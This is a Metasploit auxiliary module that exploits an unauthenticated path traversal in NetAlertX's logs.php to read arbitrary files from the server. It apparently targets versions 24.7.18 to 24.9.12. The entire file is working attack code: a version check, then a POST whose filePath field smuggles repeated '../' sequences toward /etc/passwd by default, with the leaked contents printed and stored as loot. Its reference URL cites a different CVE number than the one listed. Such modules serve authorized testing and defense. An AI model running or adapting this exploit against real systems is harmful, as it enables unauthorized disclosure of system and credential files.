class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => ' NetAlertX File Read Vulnerability',
        'Description' => %q{
          This module exploits improper authentication in logs.php endpoint. An unathenticated attacker can request log file and read any file due path traversal vulnerability.
        },
        'References' => [
          ['CVE', '2024-48766'],
          ['URL', 'https://rhinosecuritylabs.com/research/cve-2024-46506-rce-in-netalertx/']
        ],
        'Author' => [
          'chebuya', # Vulnerability discovery
          'msutovsky-r7' # Metasploit module
        ],
        'DisclosureDate' => '2025-01-30',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(20211),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'maintenance.php')
    })
    return Exploit::CheckCode::Unknown unless res&.code == 200

    html_document = res.get_html_document
    return Exploit::CheckCode::Unknown('Failed to get html document.') if html_document.blank?

    version_element = html_document.xpath('//div[text()="Installed version"]//following-sibling::*')
    return Exploit::CheckCode::Unknown('Failed to get version element.') if version_element.blank?

    version = Rex::Version.new(version_element.text&.strip&.sub(/^v/, ''))
    return Exploit::CheckCode::Safe("Version #{version} detected, which is not vulnerable.") unless version.between?(Rex::Version.new('24.7.18'), Rex::Version.new('24.9.12'))

    Exploit::CheckCode::Appears("Version #{version} detected.")
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filepath = datastore['FILEPATH']
    dummyfilename = Rex::Text.rand_text_alphanumeric(6)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/php/components/logs.php'),
      'vars_post' =>
      {
        'items' => %([{"buttons":[{"labelStringCode":"Maint_PurgeLog","event":"logManage(app.log, cleanLog)"},{"labelStringCode":"Maint_RestartServer","event":"askRestartBackend()"}],"fileName":"#{dummyfilename}","filePath":"#{traversal}#{filepath}","textAreaCssClass":"logs"}])

      }
    })

    fail_with Failure::Unreachable, 'Connection failed' unless res
    fail_with Failure::NotVulnerable, 'Unexpected response code' unless res&.code == 200
    fail_with Failure::NotVulnerable, 'Unexpected response' if res&.body.blank?

    html = res.get_html_document

    fail_with Failure::NotVulnerable, 'No HTML body' if html.blank?

    log_data = html.at('textarea')

    fail_with Failure::PayloadFailed, 'No data' if log_data&.blank? || log_data&.text&.empty?
    print_status 'Received data:'
    print_status log_data.text

    loot_path = store_loot(
      'netalert.results',
      'text/plain',
      ip,
      log_data.text,
      "netalert-#{filepath}.txt",
      'NetAlertX'
    )
    print_status "Stored results in #{loot_path}"
    report_vuln({
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Module #{fullname} successfully leaked file"
    })
  end
end
